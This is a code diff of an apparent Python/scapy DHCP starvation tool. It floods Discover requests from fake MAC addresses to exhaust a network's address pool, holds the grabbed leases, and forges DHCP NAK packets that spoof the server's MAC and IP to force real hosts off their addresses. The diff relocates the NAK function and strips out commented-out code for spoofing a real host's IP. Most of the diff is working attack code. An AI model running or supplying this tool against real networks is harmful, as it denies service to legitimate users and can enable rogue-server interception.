@@ -100,7 +100,7 @@ def get_network_params(iface_name):
     except (KeyError, IndexError):
         return None, None, None
 
-
+'''
 def get_mac(iface_name):
     """
     Get mac address from selected interface
@@ -110,7 +110,7 @@ def get_mac(iface_name):
         return mac
     except (KeyError, IndexError):
         return None
-
+'''
 
 def get_random_mac():
     """
@@ -289,6 +289,33 @@ def send_release(mac_address, interface):
     write_to_log(f"Releasing IP address {host_ip}")
 
 
+def send_nak(host):
+    '''
+    Sends an Unicast DHCP NAK
+    '''
+    # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
+    host_mac = int(host.mac_address.replace(":", ""), 16).to_bytes(6, "big")
+    global dhcp_server_mac, dhcp_server_ip
+    server_mac = int(dhcp_server_mac.replace(":", ""), 16).to_bytes(6, "big")
+    # Making DHCP NAK packet
+    ether_header = scapy.Ether(src=server_mac, 
+                               dst=host_mac)
+    ip_header = scapy.IP(src=dhcp_server_ip, 
+                         dst=host.ip_address)
+    udp_header = scapy.UDP(sport=67, 
+                           dport=68)
+    bootp_field = scapy.BOOTP(chaddr=host_mac, 
+                              xid=host.transaction_id,
+                              flags=0,
+                              op=2) # 1: "BOOTREQUEST", 2: "BOOTREPLY"
+    dhcp_field = scapy.DHCP(options=[("message-type", "nak"),
+                                     ("server_id", dhcp_server_ip),
+                                     "end"])
+    dhcp_nak = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
+
+    scapy.sendp(dhcp_nak, verbose=False, iface=iface)
+
+
 def handle_dhcp_packet(packet):
     """
     Listens for received DHCP packets
@@ -298,12 +325,14 @@ def handle_dhcp_packet(packet):
 
     # Option 2: DHCP Offer (response to Discover)
     if scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 2:
-        # Getting client info - RFC951
+        # Getting client info from BOOTP header - RFC951
         host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
         host_ip = packet[scapy.BOOTP].yiaddr
         # Check if packet is for us. If not, captured DHCP Offer is discarded
         if not is_this_mac_ours(host_mac):
             return None
+        # Updating the fake host's IP address
+        fake_host_dict[host_mac].ip_address = host_ip
         # Getting DHCP server info
         global dhcp_server_ip, dhcp_server_mac
         dhcp_server_ip = packet[scapy.BOOTP].siaddr
@@ -314,11 +343,6 @@ def handle_dhcp_packet(packet):
         else:
             # No idea how to obtain DHCP server's MAC on a broadcast DHCP Offer
             pass
-        # Updating the fake host's IP address
-        try:
-            fake_host_dict[host_mac].ip_address = host_ip
-        except KeyError:
-            write_to_log(f"Received unknown DHCP Offer")
         # Send DHCP Request
         send_request(host_mac, interface)
         
@@ -361,20 +385,6 @@ def handle_dhcp_packet(packet):
             send_nak(host)
             write_to_log(f"Sending NAK to: {host.ip_address}, {host.mac_address}, {host.hostname}, {host.transaction_id}")
 
-
-        '''
-        # Check if it's broadcast
-        if packet[scapy.Ether].dst == "ff:ff:ff:ff:ff:ff":
-            # Getting host's MAC address and Requested IP Address
-            host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
-            if not is_this_mac_ours(host_mac) or host_mac == our_mac_address:
-                #host_mac = packet[scapy.BOOTP].chaddr
-                dhcp_opts_dict = get_dhcp_options(packet)
-                ip_address = dhcp_opts_dict['requested_addr']
-                write_to_log(f"Received unknown broadcast DHCP Request: {ip_address} from {host_mac}")
-                # Trying to release his IP address and then getting it for ours
-                #release_host_and_spoof(host_mac, ip_address)
-        '''
     # Option 5: DHCP ACK, IP address successfully linked to host       
     elif scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 5:
         # Getting client info - RFC951
@@ -387,15 +397,6 @@ def handle_dhcp_packet(packet):
         
         # Updating the fake host's attributes with final decision
         dhcp_opts_dict = get_dhcp_options(packet)
-        '''
-        try:
-            #global fake_host_dict
-            fake_host_dict[host_mac].ip_address = host_ip
-            fake_host_dict[host_mac].lease_time = dhcp_opts_dict['lease_time']
-            fake_host_dict[host_mac].acquisition_time = datetime.now()
-        except KeyError:
-            write_to_log(f"Error during scan: unknown received DHCP packet")
-        '''
         fake_host_dict[host_mac].ip_address = host_ip
         fake_host_dict[host_mac].lease_time = dhcp_opts_dict['lease_time']
         fake_host_dict[host_mac].acquisition_time = datetime.now()
@@ -415,56 +416,6 @@ def handle_dhcp_packet(packet):
         None
     
 
-def send_nak(host):
-    '''
-    Sends an Unicast DHCP NAK
-    '''
-    # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
-    host_mac = int(host.mac_address.replace(":", ""), 16).to_bytes(6, "big")
-    global dhcp_server_mac, dhcp_server_ip
-    server_mac = int(dhcp_server_mac.replace(":", ""), 16).to_bytes(6, "big")
-    # Making DHCP NAK packet
-    ether_header = scapy.Ether(src=server_mac, 
-                               dst=host_mac)
-                               #dst="ff:ff:ff:ff:ff:ff")
-    ip_header = scapy.IP(src=dhcp_server_ip, 
-                         dst=host.ip_address)
-                         #dst="255.255.255.255")
-    udp_header = scapy.UDP(sport=67, 
-                           dport=68)
-    bootp_field = scapy.BOOTP(chaddr=host_mac, 
-                              xid=host.transaction_id,
-                              #xid=get_transaction_id(),
-                              flags=0,
-                              op=2) # 1: "BOOTREQUEST", 2: "BOOTREPLY"
-    dhcp_field = scapy.DHCP(options=[("message-type", "nak"),
-                                     ("server_id", dhcp_server_ip),
-                                     "end"])
-    dhcp_nak = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
-
-    scapy.sendp(dhcp_nak, verbose=False, iface=iface)
-
-
-
-
-
-    '''
-def release_host_and_spoof(mac_address, ip_address):
-    '''
-    #Releases external host IP address and try to spoof his IP
-    '''
-    host = create_fake_host()
-    # Changes new fake_host to match IP and MAC address of the real detected host
-    global fake_host_dict
-    #fake_host_dict[host.mac_address] = mac_address
-    mac_address = host.mac_address
-    fake_host_dict[host.ip_address] = ip_address
-    # Sending DHCP release
-    send_release(mac_address, iface)
-    time.sleep(1)
-    send_request(mac_address, iface)
-    '''
-
 def is_this_mac_ours(mac_address):
     '''
     Returns true if MAC address belongs to a fake host
@@ -474,6 +425,7 @@ def is_this_mac_ours(mac_address):
     else:
         return False
 
+
 def mac_to_str(bytes_value):
     '''
     Converts bytes sequence to standard hex MAC address format
@@ -481,6 +433,7 @@ def mac_to_str(bytes_value):
     hex_string = ''.join('{:02x}'.format(byte) for byte in bytes_value)
     formatted_mac_address = ':'.join(hex_string[i:i+2] for i in range(0, 12, 2))
     return formatted_mac_address
+
 
 def get_dhcp_options(packet):
     '''
@@ -493,7 +446,7 @@ def get_dhcp_options(packet):
         if opt == "end":
             break
         if isinstance(opt, tuple):
-            # Ignoring other variables inside a same option, like 2nd DNS Servers, etc
+            # Ignoring other variables inside a same option, like 2nd DNS Servers, etc. Not useful right now
             dhcp_opts_dict[opt[0]] = opt[1]
         else:
             pass
@@ -528,13 +481,14 @@ def clean_unused_fake_hosts():
 
 def is_ip_renew_needed(lease_time, acquisition_time):
     '''
-    Compares adquisition time and time now to evaluate if a IP renew is needed
+    Compares adquisition time and time now to evaluate if a IP renewal is needed
     '''
-    # Sometimes lease time/acquisition_time are not correctly assigned to fake host. idk. Junky solution... Forcing IP renew
+    # Sometimes lease time/acquisition_time are not correctly assigned to fake host. idk
     try:
         threshold = 0.5 * lease_time
         time_diff = datetime.now() - acquisition_time
     except TypeError:
+        # Junky solution... Forcing IP renew
         return True
     
     if threshold < time_diff.total_seconds():
@@ -562,7 +516,7 @@ def starve_dhcp_server(number):
     for i in range(number):
         send_discover(iface)
         time.sleep(0.05)
-    write_to_log(f"{number} DHCP Discover have been sent")
+    write_to_log(f"{number} DHCP Discover(s) have been sent")
 
 
 def ip_lease_renewal(renewal_time):
@@ -600,7 +554,7 @@ def main():
     write_to_log(f"Interface {iface} has IPaddr: {our_ip_address}, MACaddr: {our_mac_address} and netmask: {our_netmask}")
     write_to_log(f"There's a total of {max_hosts} possible hosts")
     
-    # Enabling promisc mode on selected interface, just in case
+    # Enabling promisc mode on selected interface (just in case)
     enable_promiscuous_mode(iface, True)
 
     # Starting asynchronous DHCP packet sniffer
@@ -609,8 +563,9 @@ def main():
 
     # Getting all avalaible IP from network
     starve_dhcp_server(max_hosts)
-    write_to_log(f"Waiting 5 seconds for the rest of DHCP ACK to be received")
-    time.sleep(5)
+    time_to_wait_to_receive_all_ack = 5  # seconds
+    write_to_log(f"Waiting {time_to_wait_to_receive_all_ack} second(s) for the rest of DHCP ACK to be received")
+    time.sleep(time_to_wait_to_receive_all_ack)
 
     # Removing all fake hosts with no IP address linked due to pool exhaustion
     clean_unused_fake_hosts()
@@ -619,11 +574,15 @@ def main():
     renewal_time = 60
     try:
         ip_lease_renewal(renewal_time)
+        # Sends some DHCP Discovers trying to catch IP addresses released by any real hosts  
+        #starve_dhcp_server(1)
+        #clean_unused_fake_hosts()
         #while True:
         #    None
     except Exception as e:
         # If an exception occurs (p.e. KeyboardInterrupt) all IP's will be released
         print(e)
+        #print(f"Program exception ocurred (KeyboardInterrupt?), releasing all IP addresses")
     finally:
         # Releasing all IP addresses
         release_all_ips()
